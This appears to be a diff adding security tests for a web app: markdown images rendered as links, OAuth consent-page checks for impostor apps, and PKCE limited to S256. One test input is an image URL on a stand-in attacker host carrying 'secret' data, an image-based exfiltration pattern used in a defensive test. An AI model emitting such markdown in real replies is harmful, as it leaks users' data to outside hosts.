@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { renderSafeMarkdown } from "@/lib/safe-markdown";
-import { isSafeRedirectUri } from "@/lib/oauth";
+import { createHash } from "node:crypto";
+import { clientIdentity, isSafeRedirectUri, verifyPkce } from "@/lib/oauth";
 
 /** What an HTML parser does to an attribute value: decode entities once. */
 function decodeAttribute(v: string): string {
@@ -37,6 +38,11 @@ describe("agent chat markdown is rendered safely", () => {
       expect(new URL(decodeAttribute(m[1]), "https://www.postbase.so/agent").protocol).toMatch(/^(https?|mailto):$/);
     }
   });
+  it("never loads images: they become links", () => {
+    const html = renderSafeMarkdown("![chart](https://evil.example/p?d=secret)");
+    expect(html).not.toMatch(/<img/i);
+    expect(html).toContain('<a href="https://evil.example/p?d=secret" rel="noopener noreferrer nofollow">chart</a>');
+  });
   it("still renders ordinary markdown", () => {
     expect(renderSafeMarkdown("**bold** [ok](https://postbase.so/a?x=1&y=2)")).toContain('<a href="https://postbase.so/a?x=1&amp;y=2">ok</a>');
   });
@@ -68,5 +74,29 @@ describe("redirect targets stay on Postbase", () => {
       expect(isSafePath(ok)).toBe(true);
       expect(safeNext(ok)).toBe(ok);
     }
+  });
+});
+
+describe("MCP consent page identity", () => {
+  it("shows a known logo only when the redirect matches the app", () => {
+    expect(clientIdentity("Claude", "https://claude.ai/api/mcp/auth_callback")).toEqual({ logo: "claude", destination: "claude.ai", impostor: false });
+    expect(clientIdentity("Claude Code", "http://localhost:33418/callback")).toMatchObject({ logo: "claude-code", destination: "an app on this device" });
+    expect(clientIdentity("Cursor", "cursor://anysphere.cursor-mcp/oauth/callback")).toMatchObject({ logo: "cursor", impostor: false });
+  });
+  it("flags an app that borrows a known name", () => {
+    expect(clientIdentity("Claude", "https://evil.example/cb")).toEqual({ logo: null, destination: "evil.example", impostor: true });
+    expect(clientIdentity("claude.ai.evil", "https://claude.ai.evil.example/cb")).toMatchObject({ logo: null, impostor: true });
+  });
+  it("names the destination for unknown apps without a warning", () => {
+    expect(clientIdentity("Smithery", "https://auth.smithery.ai/cb")).toEqual({ logo: null, destination: "auth.smithery.ai", impostor: false });
+  });
+});
+
+describe("PKCE", () => {
+  it("accepts S256 only", () => {
+    const verifier = "a".repeat(43);
+    const challenge = createHash("sha256").update(verifier).digest("base64url");
+    expect(verifyPkce(verifier, challenge, "S256")).toBe(true);
+    expect(verifyPkce(verifier, verifier, "plain")).toBe(false);
   });
 });
